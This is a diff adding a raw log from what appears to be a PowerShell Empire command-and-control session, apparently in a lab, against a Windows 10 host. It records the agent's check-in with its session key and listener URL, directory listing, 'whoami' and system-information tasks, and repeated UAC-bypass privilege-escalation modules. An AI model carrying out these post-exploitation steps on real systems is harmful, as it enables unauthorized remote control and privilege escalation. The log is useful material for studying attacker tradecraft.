@@ -1,0 +1,146 @@
+
+2019-05-26 09:33:10 : 
+
+[*] Agent info:
+  nonce           	3381705309140418
+  jitter          	0.6
+  servers         	None
+  internal_ip     	192.168.226.1 fe80::9442:f8f3:5b23:22d1 192.168.153.1
+                                fe80::78a5:53be:b208:43ea 10.0.0.1 fe80::a41d:e79e:d3d7:49a8
+                                169.254.182.30 fe80::4d72:dc5a:5819:b61e
+  working_hours   	
+  session_key     	csN]$%&|-a9K;_~V<yH=i{}6@OPZ/+Y2
+  children        	None
+  checkin_time    	2019-05-26 09:33:09
+  hostname        	LAMEDIM-LT
+  id              	3
+  delay           	6
+  username        	LAMEDIM-LT\User
+  kill_date       	
+  parent          	None
+  process_name    	powershell
+  listener        	http
+  process_id      	10872
+  profile         	/aduin/gut.php,/nuws.php,/lugin/pruccess.php |Mozilla/5.0 (X11; Linux
+                                x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75
+                                Safari/537.36
+  os_details      	Microsoft Windows 10 Home
+  lost_limit      	0
+  taskings        	None
+  name            	7P19Y2E6
+  language        	powershell
+  external_ip     	192.168.153.1
+  session_id      	7P19Y2E6
+  lastseen_time   	2019-05-26 09:33:09
+  language_version	5
+  high_integrity  	0
+
+
+[+] Agent 7P19Y2E6 now active:
+
+
+2019-05-26 09:33:59 : 
+[*] Agent renamed from 7P19Y2E6 to win10
+
+2019-05-26 09:34:16 : 
+[*] Agent renamed from 7P19Y2E6 to host
+
+2019-05-26 09:35:10 : 
+Tasked agent to run module powershell/privesc/bypassuac_env
+
+2019-05-26 09:35:15 : 
+Job started: M3UXFY
+
+2019-05-26 09:36:24 : 
+Tasked agent to run command dir
+
+2019-05-26 09:36:29 : 
+Mode   Owner                  LastWriteTime         length  Name                                                       
+----   -----                  -------------         ------  ----                                                       
+d----- BUILTIN\Administrators 5/2/2019 1:04:53 PM           .BigNox                                                    
+d-r--- LAMEDIM-LT\User        5/14/2019 8:14:55 PM          3D Objects                                                 
+d--h-- LAMEDIM-LT\User        5/14/2019 8:11:52 PM          AppData                                                    
+d--hsl LAMEDIM-LT\User        5/14/2019 8:10:07 PM          Application Data                                           
+d-r--- LAMEDIM-LT\User        5/14/2019 8:14:55 PM          Contacts                                                   
+d--hsl LAMEDIM-LT\User        5/14/2019 8:10:07 PM          Cookies                                                    
+d-r--- LAMEDIM-LT\User        5/25/2019 5:41:40 PM          Desktop                                                    
+d-r--- LAMEDIM-LT\User        5/26/2019 9:17:59 AM          Documents                                                  
+d-r--- LAMEDIM-LT\User        5/25/2019 11:28:34 PM         Downloads                                                  
+d-r--- LAMEDIM-LT\User        5/14/2019 8:14:55 PM          Favorites                                                  
+d-r--- LAMEDIM-LT\User        1/30/2018 8:06:29 PM          Google Drive                                               
+d--hs- LAMEDIM-LT\User        5/25/2019 5:43:01 PM          IntelGraphicsProfiles                                      
+d-r--- LAMEDIM-LT\User        5/14/2019 8:14:55 PM          Links                                                      
+d--hsl LAMEDIM-LT\User        5/14/2019 8:10:07 PM          Local Settings                                             
+d--h-- LAMEDIM-LT\User        12/19/2017 8:20:49 PM         MicrosoftEdgeBackups                                       
+d-r--- LAMEDIM-LT\User        5/14/2019 8:14:55 PM          Music                                                      
+d--hsl LAMEDIM-LT\User        5/14/2019 8:10:07 PM          My Documents                                               
+d--hsl LAMEDIM-LT\User        5/14/2019 8:10:07 PM          NetHood                                                    
+d----- BUILTIN\Administrators 5/2/2019 1:04:59 PM           Nox_share                                                  
+dar--l LAMEDIM-LT\User        5/25/2019 5:43:34 PM          OneDrive                                                   
+d----- LAMEDIM-LT\User        4/7/2019 9:00:38 AM           OpenVPN                                                    
+d-r--- LAMEDIM-LT\User        5/14/2019 8:14:55 PM          Pictures                                                   
+d--hsl LAMEDIM-LT\User        5/14/2019 8:10:07 PM          PrintHood                                                  
+d--hsl LAMEDIM-LT\User        5/14/2019 8:10:07 PM          Recent                                                     
+d----- LAMEDIM-LT\User        9/18/2018 10:06:00 PM         Roaming                                                    
+d-r--- LAMEDIM-LT\User        5/14/2019 8:14:55 PM          Saved Games                                                
+d-r--- LAMEDIM-LT\User        5/14/2019 8:14:55 PM          Searches                                                   
+d--hsl LAMEDIM-LT\User        5/14/2019 8:10:07 PM          SendTo                                                     
+d--hsl LAMEDIM-LT\User        5/14/2019 8:10:07 PM          Start Menu                                                 
+d--hsl LAMEDIM-LT\User        5/14/2019 8:10:07 PM          Templates                                                  
+d-r--- LAMEDIM-LT\User        5/14/2019 8:14:55 PM          Videos                                                     
+d----- BUILTIN\Administrators 5/2/2019 1:04:52 PM           vmlogs                                                     
+-a---- BUILTIN\Administrators 5/3/2019 9:03:38 AM   298     d4ac4633ebd6440fa397b84f1bc94a3c.7z                        
+-a---- BUILTIN\Administrators 5/2/2019 1:05:11 PM   66      inittk.ini                                                 
+-a---- BUILTIN\Administrators 5/2/2019 1:04:54 PM   41      inst.ini                                                   
+-a-h-- LAMEDIM-LT\User        5/24/2019 10:59:40 AM 5505024 NTUSER.DAT                                                 
+-a-hs- NT AUTHORITY\SYSTEM    5/14/2019 8:10:07 PM  221184  ntuser.dat.LOG1                                            
+-a-hs- NT AUTHORITY\SYSTEM    5/14/2019 8:10:07 PM  1519616 ntuser.dat.LOG2                                            
+-a-hs- NT AUTHORITY\SYSTEM    5/25/2019 6:11:44 PM  1048576 NTUSER.DAT{448f5624-7673-11e9-aa62-005056c00008}.TxR.0.regt
+                                                            rans-ms                                                    
+-a-hs- NT AUTHORITY\SYSTEM    5/25/2019 5:42:59 PM  1048576 NTUSER.DAT{448f5624-7673-11e9-aa62-005056c00008}.TxR.1.regt
+                                                            rans-ms                                                    
+-a-hs- NT AUTHORITY\SYSTEM    5/25/2019 5:42:59 PM  1048576 NTUSER.DAT{448f5624-7673-11e9-aa62-005056c00008}.TxR.2.regt
+                                                            rans-ms                                                    
+-a-hs- BUILTIN\Administrators 5/25/2019 6:11:44 PM  65536   NTUSER.DAT{448f5624-7673-11e9-aa62-005056c00008}.TxR.blf   
+-a-hs- NT AUTHORITY\SYSTEM    5/14/2019 8:10:07 PM  65536   NTUSER.DAT{448f5625-7673-11e9-aa62-005056c00008}.TM.blf    
+-a-hs- NT AUTHORITY\SYSTEM    5/14/2019 8:10:07 PM  524288  NTUSER.DAT{448f5625-7673-11e9-aa62-005056c00008}.TMContaine
+                                                            r00000000000000000001.regtrans-ms                          
+-a-hs- NT AUTHORITY\SYSTEM    5/14/2019 8:10:07 PM  524288  NTUSER.DAT{448f5625-7673-11e9-aa62-005056c00008}.TMContaine
+                                                            r00000000000000000002.regtrans-ms                          
+---hs- BUILTIN\Administrators 5/14/2019 8:14:47 PM  20      ntuser.ini                                                 
+-a---- BUILTIN\Administrators 5/2/2019 1:04:54 PM   45      nuuid.ini                                                  
+-a---- BUILTIN\Administrators 5/2/2019 1:04:54 PM   53      useruid.ini
+
+2019-05-26 09:36:39 : 
+Tasked agent to run command whoami
+
+2019-05-26 09:36:39 : 
+LAMEDIM-LT\User
+
+2019-05-26 09:37:03 : 
+Tasked agent to get system information
+
+2019-05-26 09:37:06 : 
+Listener:         http://192.168.153.136:8081
+Internal IP:    192.168.226.1 fe80::9442:f8f3:5b23:22d1 192.168.153.1 fe80::78a5:53be:b208:43ea 10.0.0.1 fe80::a41d:e79e:d3d7:49a8 169.254.182.30 fe80::4d72:dc5a:5819:b61e
+Username:         LAMEDIM-LT\User
+Hostname:       LAMEDIM-LT
+OS:               Microsoft Windows 10 Home
+High Integrity:   0
+Process Name:     powershell
+Process ID:       10872
+Language:         powershell
+Language Version: 5
+
+
+2019-05-26 09:37:46 : 
+Tasked agent to run module powershell/privesc/bypassuac
+
+2019-05-26 09:37:49 : 
+Job started: VH4XCE
+
+2019-05-26 12:20:22 : 
+Tasked agent to run module powershell/privesc/bypassuac_env
+
+2019-05-26 12:20:25 : 
+Job started: EA8KFZ
